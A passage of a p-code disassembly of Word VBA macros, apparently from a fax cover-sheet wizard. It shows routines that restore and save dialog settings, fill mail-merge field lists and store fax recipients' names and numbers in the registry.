0x0001 \n' \tArgsMemLd Insert 0x0002 \n' \tSet objActiveRange \n' Line #1388:\n' Line #1389:\n' \tExitSub \n' Line #1390:\n' \tLabel FatalError \n' Line #1391:\n' \tLd strERR_AUTOTEXT_NOT_FOUND \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #1392:\n' \tEndSub \n' Line #1393:\n' Line #1394:\n' Line #1395:\n' \tFuncDefn (Public Sub RestoreDialogValues(fDummy As Boolean))\n' Line #1396:\n' \tDim \n' \tVarDefn fAddrBkEnable (As Boolean)\n' Line #1397:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1398:\n' \tDim \n' \tVarDefn strChkdAddr (As String)\n' Line #1399:\n' Line #1400:\n' \tOnError FatalError \n' Line #1401:\n' \tLd strRST_SETTINGS \n' \tSt StatusBar \n' Line #1402:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #1403:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #1404:\n' Line #1405:\n' \tLd Application \n' \tMemLd MAPIAvailable \n' \tSt fAddrBkEnable \n' Line #1406:\n' \tLd fAddrBkEnable \n' \tLd formWizard \n' \tMemLd cmdRcpntsAddrBk \n' \tMemSt Enabled \n' Line #1407:\n' \tLd fAddrBkEnable \n' \tLd formWizard \n' \tMemLd cmdSenderAddrBk \n' \tMemSt Enabled \n' Line #1408:\n' Line #1409:\n' \tQuoteRem 0x0000 0x0047 \"Setting options in Panel1 depending on whether a doc. is present or not\"\n' Line #1410:\n' \tLd fDocPresent \n' \tIfBlock \n' Line #1411:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optCurDoc \n' \tMemSt Value \n' Line #1412:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optCurDocCovShtYes \n' \tMemSt Value \n' Line #1413:\n' \tElseBlock \n' Line #1414:\n' \tQuoteRem 0x0008 0x001A \"disable a bunch of options\"\n' Line #1415:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd optCurDoc \n' \tMemSt Enabled \n' Line #1416:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cboDocList \n' \tMemSt Enabled \n' Line #1417:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd optCurDocCovShtNo \n' \tMemSt Enabled \n' Line #1418:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd optCurDocCovShtYes \n' \tMemSt Enabled \n' Line #1419:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optCovSht \n' \tMemSt Value \n' Line #1420:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd frmRcpntsFormDoc \n' \tMemSt Visible \n' Line #1421:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd frmRcpntsOrdDoc \n' \tMemSt Visible \n' Line #1422:\n' Line #1423:\n' \tEndIfBlock \n' Line #1424:\n' Line #1425:\n' \tQuoteRem 0x0004 0x0006 \"Panel2\"\n' Line #1426:\n' \tQuoteRem 0x0004 0x001A \"read values from registry.\"\n' Line #1427:\n' \tLitStr 0x000A \"Fax Option\"\n' \tLitDI2 0x0000 \n' \tArgsLd IRestorePref 0x0002 \n' \tSt iFaxOption \n' Line #1428:\n' \tLd System \n' \tMemLd OperatingSystem \n' \tArgsLd UCase$ 0x0001 \n' \tLitStr 0x0002 \"NT\"\n' \tFnInStr \n' \tIfBlock \n' Line #1429:\n' \tLitVarSpecial (False)\n' \tSt fMSFAXEnabled \n' Line #1430:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd optMSFax \n' \tMemSt Enabled \n' Line #1431:\n' \tElseBlock \n' Line #1432:\n' \tLitVarSpecial (True)\n' \tSt fMSFAXEnabled \n' Line #1433:\n' \tEndIfBlock \n' Line #1434:\n' \tQuoteRem 0x0004 0x0037 \"set printer in combo-box before disabling frmFaxDriver.\"\n' Line #1435:\n' \tArgsCall GetAllPrinters 0x0000 \n' Line #1436:\n' Line #1437:\n' \tQuoteRem 0x0004 0x0044 \"the controls are assumed to be enabled initially and are explicityly\"\n' Line #1438:\n' \tQuoteRem 0x0004 0x0021 \"only turned off, never turned on.\"\n' Line #1439:\n' \tLd iFaxOption \n' \tLd iMS_FAX \n' \tEq \n' \tParen \n' \tLd fMSFAXEnabled \n' \tParen \n' \tNot \n' \tAnd \n' \tIfBlock \n' Line #1440:\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x0000 \n' \tGt \n' \tIfBlock \n' Line #1441:\n' \tLd iDIFF_FAX \n' \tSt iFaxOption \n' Line #1442:\n' \tElseBlock \n' Line #1443:\n' \tLd iNO_FAX \n' \tSt iFaxOption \n' Line #1444:\n' \tEndIfBlock \n' Line #1445:\n' \tEndIfBlock \n' Line #1446:\n' \tLd iFaxOption \n' \tSelectCase \n' Line #1447:\n' \tLd iMS_FAX \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #1448:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optMSFax \n' \tMemSt Value \n' Line #1449:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemSt Enabled \n' Line #1450:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd lblFaxDriver \n' \tMemSt Enabled \n' Line #1451:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cmdOtherPrinters \n' \tMemSt Enabled \n' Line #1452:\n' \tLd iDIFF_FAX \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #1453:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optDifferentFax \n' \tMemSt Value \n' Line #1454:\n' \tLd iNO_FAX \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' Line #1455:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optNoFax \n' \tMemSt Value \n' Line #1456:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemSt Enabled \n' Line #1457:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd lblFaxDriver \n' \tMemSt Enabled \n' Line #1458:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cmdOtherPrinters \n' \tMemSt Enabled \n' Line #1459:\n' \tCaseElse \n' Line #1460:\n' \tLd iNO_FAX \n' \tSt iFaxOption \n' Line #1461:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optNoFax \n' \tMemSt Value \n' Line #1462:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemSt Enabled \n' Line #1463:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd lblFaxDriver \n' \tMemSt Enabled \n' Line #1464:\n' \tLitVarSpecial (False)\n' \tLd formWizard \n' \tMemLd cmdOtherPrinters \n' \tMemSt Enabled \n' Line #1465:\n' Line #1466:\n' \tEndSelect \n' Line #1467:\n' Line #1468:\n' \tQuoteRem 0x0004 0x0006 \"Panel3\"\n' Line #1469:\n' \tLitVarSpecial (False)\n' \tSt fRegistryNamesRead \n' Line #1470:\n' Line #1471:\n' \tQuoteRem 0x0004 0x0006 \"Panel5\"\n' Line #1472:\n' \tLd Application \n' \tMemLd UserName \n' \tLd formWizard \n' \tMemLd txtSenderName \n' \tMemSt Then \n' Line #1473:\n' Line #1474:\n' \tLd Application \n' \tMemLd UserAddress \n' \tLd strChkdAddr \n' \tLd iMAX_ADDR_LINES \n' \tArgsLd ICountLines 0x0003 \n' \tSt i \n' Line #1475:\n' \tLd strChkdAddr \n' \tLd formWizard \n' \tMemLd txtMailingAddr \n' \tMemSt Then \n' Line #1476:\n' \tLitStr 0x000A \"Sender Fax\"\n' \tLitStr 0x0000 \"\"\n' \tArgsLd StrRestorePref 0x0002 \n' \tLd formWizard \n' \tMemLd txtSenderFax \n' \tMemSt Then \n' Line #1477:\n' \tLitStr 0x000C \"Sender Phone\"\n' \tLitStr 0x0000 \"\"\n' \tArgsLd StrRestorePref 0x0002 \n' \tLd formWizard \n' \tMemLd txtSenderPhone \n' \tMemSt Then \n' Line #1478:\n' Line #1479:\n' \tQuoteRem 0x0004 0x0007 \"Panel 4\"\n' Line #1480:\n' \tLitStr 0x0010 \"Coversheet Style\"\n' \tLitDI2 0x0000 \n' \tArgsLd IRestorePref 0x0002 \n' \tSt iFaxStyle \n' Line #1481:\n' \tLineCont 0x0004 0D 00 08 00\n' \tLd iFaxStyle \n' \tLd iSTY_PROFESSIONAL \n' \tLt \n' \tParen \n' \tLd iFaxStyle \n' \tLd iSTY_ELEGANT \n' \tGt \n' \tParen \n' \tOr \n' \tIf \n' \tBoSImplicit \n' \tLd iSTY_PROFESSIONAL \n' \tSt iFaxStyle \n' \tEndIf \n' Line #1482:\n' \tLd iFaxStyle \n' \tSelectCase \n' Line #1483:\n' \tLd iSTY_PROFESSIONAL \n' \tCase \n' \tCaseDone \n' Line #1484:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optStyleProf \n' \tMemSt Value \n' Line #1485:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd lblStyle0 \n' \tMemSt Visible \n' Line #1486:\n' \tLd iSTY_CONTEMPORARY \n' \tCase \n' \tCaseDone \n' Line #1487:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optStyleCont \n' \tMemSt Value \n' Line #1488:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd lblStyle1 \n' \tMemSt Visible \n' Line #1489:\n' \tLd iSTY_ELEGANT \n' \tCase \n' \tCaseDone \n' Line #1490:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd optStyleEleg \n' \tMemSt Value \n' Line #1491:\n' \tLitVarSpecial (True)\n' \tLd formWizard \n' \tMemLd lblStyle2 \n' \tMemSt Visible \n' Line #1492:\n' \tEndSelect \n' Line #1493:\n' Line #1494:\n' \tOnError <crash> \n' \tQuoteRem 0x0015 0x0010 \"reset error trap\"\n' Line #1495:\n' \tOnError (Resume Next) \n' Line #1496:\n' \tLitStr 0x0000 \"\"\n' \tLd strREGKEY_CMPNY_NAME \n' \tLd strVALKEY_CMPNY_NAME \n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tLd formWizard \n' \tMemLd txtCompany \n' \tMemSt Then \n' Line #1497:\n' \tLitVarSpecial (True)\n' \tSt fSettingsRestored \n' Line #1498:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #1499:\n' \tLitStr 0x0000 \"\"\n' \tSt StatusBar \n' Line #1500:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #1501:\n' Line #1502:\n' \tExitSub \n' Line #1503:\n' Line #1504:\n' \tLabel FatalError \n' Line #1505:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1506:\n' \tEndSub \n' Line #1507:\n' Line #1508:\n' \tQuoteRem 0x0000 0x0019 \"sets default merge fields\"\n' Line #1509:\n' \tFuncDefn (Public Sub FillMergeFields(fDummy As Boolean))\n' Line #1510:\n' \tDim \n' \tVarDefn i (As Integer)\n' \tVarDefn iCount (As Integer)\n' Line #1511:\n' \tDim \n' \tVarDefn iFirstName (As Integer)\n' Line #1512:\n' \tDim \n' \tVarDefn iLastName (As Integer)\n' Line #1513:\n' \tDim \n' \tVarDefn iFax (As Integer)\n' Line #1514:\n' \tDim \n' \tVarDefn rgstrNames (As String)\n' Line #1515:\n' \tDim \n' \tVarDefn objFieldNames (As MailMergeFieldNames)\n' Line #1516:\n' \tDim \n' \tVarDefn objTempDoc (As Document)\n' Line #1517:\n' Line #1518:\n' \tOnError FatalError \n' Line #1519:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt iFirstName \n' Line #1520:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt iLastName \n' Line #1521:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt iFax \n' Line #1522:\n' Line #1523:\n' \tQuoteRem 0x0004 0x0046 \"reset the query options so that all names in the data src are selected\"\n' Line #1524:\n' Line #1525:\n' \tSetStmt \n' \tLd objDataSrc \n' \tMemLd FieldNames \n' \tSet objFieldNames \n' Line #1526:\n' \tLd objFieldNames \n' \tMemLd Count \n' \tSt iCount \n' Line #1527:\n' \tOptionBase \n' \tLd iCount \n' \tLitDI2 0x0001 \n' \tSub \n' \tRedim rgstrNames 0x0001 (As Variant)\n' Line #1528:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iCount \n' \tFor \n' Line #1529:\n' \tLd i \n' \tArgsLd objFieldNames 0x0001 \n' \tMemLd New \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsSt rgstrNames 0x0001 \n' Line #1530:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrNames 0x0001 \n' \tLd strFLD_NAME \n' \tFnInStr \n' \tIfBlock \n' Line #1531:\n' \tLd iFirstName \n' \tLitDI2 0x0001 \n' \tUMi \n' \tEq \n' \tIfBlock \n' Line #1532:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt iFirstName \n' Line #1533:\n' \tLd iLastName \n' \tLitDI2 0x0001 \n' \tUMi \n' \tEq \n' \tElseIfBlock \n' Line #1534:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt iLastName \n' Line #1535:\n' \tEndIfBlock \n' Line #1536:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrNames 0x0001 \n' \tLd strFLD_FAX \n' \tFnInStr \n' \tElseIfBlock \n' Line #1537:\n' \tLd iFax \n' \tLitDI2 0x0001 \n' \tUMi \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt iFax \n' \tEndIf \n' Line #1538:\n' \tEndIfBlock \n' Line #1539:\n' Line #1540:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1541:\n' Line #1542:\n' \tLd rgstrNames \n' \tLd formWizard \n' \tMemLd cboFldsRcpntFirstName \n' \tMemSt List \n' Line #1543:\n' \tLd rgstrNames \n' \tLd formWizard \n' \tMemLd cboFldsRcpntLastName \n' \tMemSt List \n' Line #1544:\n' \tLd rgstrNames \n' \tLd formWizard \n' \tMemLd cboFldsFaxNum \n' \tMemSt List \n' Line #1545:\n' Line #1546:\n' \tLd strNONE \n' \tLd formWizard \n' \tMemLd cboFldsRcpntFirstName \n' \tArgsMemCall AddItem 0x0001 \n' Line #1547:\n' \tLd strNONE \n' \tLd formWizard \n' \tMemLd cboFldsRcpntLastName \n' \tArgsMemCall AddItem 0x0001 \n' Line #1548:\n' Line #1549:\n' \tLd iFirstName \n' \tLitDI2 0x0001 \n' \tUMi \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #1550:\n' \tLd iFirstName \n' \tArgsLd rgstrNames 0x0001 \n' \tLd formWizard \n' \tMemLd cboFldsRcpntFirstName \n' \tMemSt Value \n' Line #1551:\n' \tElseBlock \n' Line #1552:\n' \tLd strNONE \n' \tLd formWizard \n' \tMemLd cboFldsRcpntFirstName \n' \tMemSt Value \n' Line #1553:\n' \tEndIfBlock \n' Line #1554:\n' Line #1555:\n' \tLd iLastName \n' \tLitDI2 0x0001 \n' \tUMi \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #1556:\n' \tLd iLastName \n' \tArgsLd rgstrNames 0x0001 \n' \tLd formWizard \n' \tMemLd cboFldsRcpntLastName \n' \tMemSt Value \n' Line #1557:\n' \tElseBlock \n' Line #1558:\n' \tLd strNONE \n' \tLd formWizard \n' \tMemLd cboFldsRcpntLastName \n' \tMemSt Value \n' Line #1559:\n' \tEndIfBlock \n' Line #1560:\n' Line #1561:\n' \tLineCont 0x0004 08 00 08 00\n' \tLd iFax \n' \tLitDI2 0x0001 \n' \tUMi \n' \tNe \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLd iFax \n' \tArgsLd rgstrNames 0x0001 \n' \tLd formWizard \n' \tMemLd cboFldsFaxNum \n' \tMemSt Value \n' \tEndIf \n' Line #1562:\n' Line #1563:\n' \tExitSub \n' Line #1564:\n' Line #1565:\n' \tLabel FatalError \n' Line #1566:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1567:\n' \tEndSub \n' Line #1568:\n' Line #1569:\n' \tQuoteRem 0x0000 0x0033 \"retrieves the Names and numbers stored in registry.\"\n' Line #1570:\n' \tFuncDefn (Sub ReadRegistryFaxNames(fDummy As Boolean))\n' Line #1571:\n' \tDim \n' \tVarDefn j (As Integer)\n' \tVarDefn k (As Integer)\n' Line #1572:\n' \tDim \n' \tVarDefn objCtrls (As Object)\n' Line #1573:\n' \tOnError FatalError \n' Line #1574:\n' \tLitVarSpecial (True)\n' \tSt fRegistryNamesRead \n' Line #1575:\n' \tSetStmt \n' \tLd iPANEL_RCPNTS \n' \tLd formWizard \n' \tMemLd mpgWizardPage \n' \tArgsMemLd Pages 0x0001 \n' \tMemLd Controls \n' \tSet objCtrls \n' Line #1576:\n' Line #1577:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iMAX_RCPNTS \n' \tFor \n' Line #1578:\n' \tLd strRCPNT_NAME \n' \tLd j \n' \tConcat \n' \tLitStr 0x0000 \"\"\n' \tArgsLd StrRestorePref 0x0002 \n' \tLd j \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsSt rgstrMRUFaxNames 0x0001 \n' Line #1579:\n' \tLd strRCPNT_NUMBER \n' \tLd j \n' \tConcat \n' \tLitStr 0x0000 \"\"\n' \tArgsLd StrRestorePref 0x0002 \n' \tLd j \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsSt rgstrMRUFaxNums 0x0001 \n' Line #1580:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tNextVar \n' Line #1581:\n' Line #1582:\n' Line #1583:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLd iMAX_RCPNTS \n' \tLitDI2 0x0001 \n' \tSub \n' \tFor \n' Line #1584:\n' \tLd rgstrMRUFaxNames \n' \tLd strCBO_RCPNT_NAME \n' \tLd j \n' \tConcat \n' \tArgsLd objCtrls 0x0001 \n' \tMemSt List \n' Line #1585:\n' \tLd rgstrMRUFaxNums \n' \tLd strCBO_RCPNT_NUM \n' \tLd j \n' \tConcat \n' \tArgsLd objCtrls 0x0001 \n' \tMemSt List \n' Line #1586:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tNextVar \n' Line #1587:\n' Line #1588:\n' \tExitSub \n' Line #1589:\n' Line #1590:\n' \tLabel FatalError \n' Line #1591:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1592:\n' \tEndSub \n' Line #1593:\n' \tFuncDefn (Sub SaveDialogValues(fDummy As Boolean))\n' Line #1594:\n' \tOnError FatalError \n' Line #1595:\n' Line #1596:\n' \tLd strSAVE_SETTINGS \n' \tSt StatusBar \n' Line #1597:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #1598:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #1599:\n' Line #1600:\n' \tLd Now \n' \tLitStr 0x000C \"General Date\"\n' \tArgsLd Format$$ 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tLd strREG_SETTINGS_BASE_KEY \n' \tLd strREG_ASSISTANT_TIME_STAMP \n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #1601:\n' \tLd strREG_ASSISTANT_HELP \n' \tLd iLocalState \n' \tArgsCall StoreValPref 0x0002 \n' Line #1602:\n' Line #1603:\n' \tLitStr 0x000A \"Fax Option\"\n' \tLd iFaxOption \n' \tCoerce (Str) \n' \tArgsCall StorePref 0x0002 \n' Line #1604:\n' \tLineCont 0x0004 05 00 08 00\n' \tLd iFaxOption \n' \tLd iDIFF_FAX \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000A \"Fax Driver\"\n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemLd Then \n' \tArgsCall StorePref 0x0002 \n' \tEndIf \n' Line #1605:\n' Line #1606:\n' \tLitStr 0x000A \"Sender Fax\"\n' \tLd formWizard \n' \tMemLd txtSenderFax \n' \tMemLd Then \n' \tArgsCall StorePref 0x0002 \n' Line #1607:\n' \tLitStr 0x000C \"Sender Phone\"\n' \tLd formWizard \n' \tMemLd txtSenderPhone \n' \tMemLd Then \n' \tArgsCall StorePref 0x0002 \n' Line #1608:\n' \tLitStr 0x0010 \"Coversheet Style\"\n' \tLd iFaxStyle \n' \tCoerce (Str) \n' \tArgsCall StorePref 0x0002 \n' Line #1609:\n' Line #1610:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tIf \n' \tBoSImplicit \n' \tArgsCall SaveRcpntsInRegistry 0x0000 \n' \tEndIf \n' Line #1611:\n' Line #1612:\n' \tLitVarSpecial (True)\n' \tSt fSettingsSaved \n' Line #1613:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #1614:\n' \tLitStr 0x0000 \"\"\n' \tSt StatusBar \n' Line #1615:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #1616:\n' Line #1617:\n' \tExitSub \n' Line #1618:\n' Line #1619:\n' \tLabel FatalError \n' Line #1620:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1621:\n' \tEndSub \n' Line #1622:\n' Line #1623:\n' \tQuoteRem 0x0000 0x0041 \"stores the recipient names and numbers of iMAX_RCPNTS recipients.\"\n' Line #1624:\n' \tQuoteRem 0x0000 0x004A \"The name is tagged to the number. So, you can have a number without a name\"\n' Line #1625:\n' \tQuoteRem 0x0000 0x001F \"but not a name without a number\"\n' Line #1626:\n' \tFuncDefn (Private Sub SaveRcpntsInRegistry())\n' Line #1627:\n' \tQuoteRem 0x0000 0x0015 \"Dim strName As String\"\n' Line #1628:\n' \tDim \n' \tVarDefn strNum (As String)\n' Line #1629:\n' \tDim \n' \tVarDefn i (As Integer)\n' \tVarDefn j (As Integer)\n' \tVarDefn k (As Integer)\n' Line #1630:\n' \tDim \n' \tVarDefn objCtrls (As Object)\n' Line #1631:\n' Line #1632:\n' \tOnError FatalError \n' Line #1633:\n' \tLitDI2 0x0000 \n' \tSt k \n' Line #1634:\n' \tQuoteRem 0x0004 0x0036 \"initialize the arrays so that even if the user has not\"\n' Line #1635:\n' \tQuoteRem 0x0004 0x0044 \"chosen any recipient we can still use the first entry of the arrays.\"\n' Line #1636:\n' \tLitStr 0x0000 \"\"\n' \tLitDI2 0x0000 \n' \tArgsSt rgstrRcpntFaxNames 0x0001 \n' Line #1637:\n' \tLitStr 0x0000 \"\"\n' \tLitDI2 0x0000 \n' \tArgsSt rgstrRcpntFaxNums 0x0001 \n' Line #1638:\n' \tLitDI2 0x0000 \n' \tSt iNumRcpnts \n' Line #1639:\n' Line #1640:\n' \tSetStmt \n' \tLd iPANEL_RCPNTS \n' \tLd formWizard \n' \tMemLd mpgWizardPage \n' \tArgsMemLd Pages 0x0001 \n' \tMemLd Controls \n' \tSet objCtrls \n' Line #1641:\n' Line #1642:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLd iMAX_RCPNTS \n' \tLitDI2 0x0001 \n' \tSub \n' \tFor \n' Line #1643:\n' \tLd strCBO_RCPNT_NUM \n' \tLd i \n' \tConcat \n' \tArgsLd objCtrls 0x0001 \n' \tMemLd Then \n' \tLd vbTab \n' \tLitStr 0x0001 \" \"\n' \tArgsLd StrSearchReplace 0x0003 \n' \tSt strNum \n' \tQuoteRem 0x0053 0x0010 \"recipient number\"\n' Line #1644:\n' \tLd strNum \n' \tFnLen \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x001E 0x0013 \"if number not empty\"\n' Line #1645:\n' \tLd strNum \n' \tLd k \n' \tArgsSt rgstrRcpntFaxNums 0x0001 \n' \tQuoteRem 0x002A 0x000C \"store number\"\n' Line #1646:\n' \tLd strCBO_RCPNT_NAME \n' \tLd i \n' \tConcat \n' \tArgsLd objCtrls 0x0001 \n' \tMemLd Then \n' \tLd vbTab \n' \tLitStr 0x0001 \" \"\n' \tArgsLd StrSearchReplace 0x0003 \n' \tLd k \n' \tArgsSt rgstrRcpntFaxNames 0x0001 \n' \tQuoteRem 0x0067 0x0016 \"and corresponding name\"\n' Line #1647:\n' \tLd k \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt k \n' Line #1648:\n' \tLd strRCPNT_NUMBER \n' \tLd k \n' \tConcat \n' \tLd strNum \n' \tArgsCall StorePref 0x0002 \n' \tQuoteRem 0x0032 0x000C \"store number\"\n' Line #1649:\n' \tLd strRCPNT_NAME \n' \tLd k \n' \tConcat \n' \tLd k \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrRcpntFaxNames 0x0001 \n' \tArgsCall StorePref 0x0002 \n' Line #1650:\n' Line #1651:\n' \tLd strCBO_RCPNT_NUM \n' \tLd i \n' \tConcat \n' \tArgsLd objCtrls 0x0001 \n' \tMemLd ListIndex \n' \tSt j \n' Line #1652:\n' Line #1653:\n' \tQuoteRem 0x000C 0x0020 \"user selected one of the choices\"\n' Line #1654:\n' \tLd j \n' \tLitDI2 0x0001 \n' \tUMi \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tLd j \n' \tArgsSt rgstrMRUFaxNums 0x0001 \n' \tEndIf \n' \tQuoteRem 0x0035 0x001B \"already picked up this text\"\n' Line #1655:\n' \tEndIfBlock \n' Line #1656:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1657:\n' Line #1658:\n' \tLd k \n' \tSt iNumRcpnts \n' Line #1659:\n' Line #1660:\n' \tLitDI2 0x0000 \n' \tSt j \n' Line #1661:\n' \tLd k \n' \tLd iMAX_RCPNTS \n' \tLt \n' \tParen \n' \tWhile \n' \tQuoteRem 0x001C 0x0023 \"if we haven't yet iMAX_RCPNTS names\"\n' Line #1662:\n' \tQuoteRem 0x0008 0x0039 \"go through the array of orginally obtained recipients and\"\n' Line #1663:\n' \tQuoteRem 0x0008 0x0023 \"store which haven't yet been stored\"\n' Line #1664:\n' \tLd j \n' \tLd iMAX_RCPNTS \n' \tLt \n' \tParen \n' \tLd j \n' \tArgsLd rgstrMRUFaxNums 0x0001 \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tAnd \n' \tParen \n' \tWhile \n' Line #1665:\n' \tLd j \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt j \n' Line #1666:\n' \tWend \n' Line #1667:\n' Line #1668:\n' \tLd j \n' \tLd iMAX_RCPNTS \n' \tEq \n' \tIfBlock \n' Line #1669:\n' \tGoTo LReturn \n' \tQuoteRem 0x0019 0x0015 \"no names left to fill\"\n' Line #1670:\n' \tElseBlock \n' Line #1671:\n' \tLd k \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt k \n' Line #1672:\n' \tLd strRCPNT_NAME \n' \tLd k \n' \tConcat \n' \tLd j \n' \tArgsLd rgstrMRUFaxNames 0x0001 \n' \tArgsCall StorePref 0x0002 \n' \tQuoteRem 0x003D 0x000A \"store name\"\n' Line #1673:\n' \tLd strRCPNT_NUMBER \n' \tLd k \n' \tConcat \n' \tLd j \n' \tArgsLd rgstrMRUFaxNums 0x0001 \n' \tArgsCall StorePref 0x0002 \n' \tQuoteRem 0x003E 0x0018 \"and corresponding number\"\n' Line #1674:\n' \tLitStr 0x0000 \"\"\n' \tLd j \n' \tArgsSt rgstrMRUFaxNums 0x0001 \n' Line #1675:\n' \tEndIfBlock \n' Line #1676:\n' \tWend \n' Line #1677:\n' Line #1678:\n' \tLabel LReturn \n' Line #1679:\n' \tExitSub \n' Line #1680:\n' \tLabel FatalError \n' Line #1681:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1682:\n' \tEndSub \n' Line #1683:\n' Line #1684:\n' \tQuoteRem 0x0000 0x002D \"Error will be taken care of in SetupDocForFax\"\n' Line #1685:\n' \tQuoteRem 0x0000 0x004B \"Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\"\n' Line #1686:\n' \tQuoteRem 0x0000 0x0026 \"Activedocument is new cover sheet doc.\"\n' Line #1687:\n' \tFuncDefn (Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean))\n' Line #1688:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1689:\n' \tDim \n' \tVarDefn objVars (As Variables)\n' Line #1690:\n' \tDim \n' \tVarDefn strTemp (As String)\n' \tVarDefn strFaxFld (As String)\n' Line #1691:\n' Line #1692:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd Variables \n' \tSet objVars \n' Line #1693:\n' \tLd strNUM_RCPNTS \n' \tLd iNumRcpnts \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1694:\n' Line #1695:\n' \tLd fSaveRcpnts \n' \tIfBlock \n' Line #1696:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #1697:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd 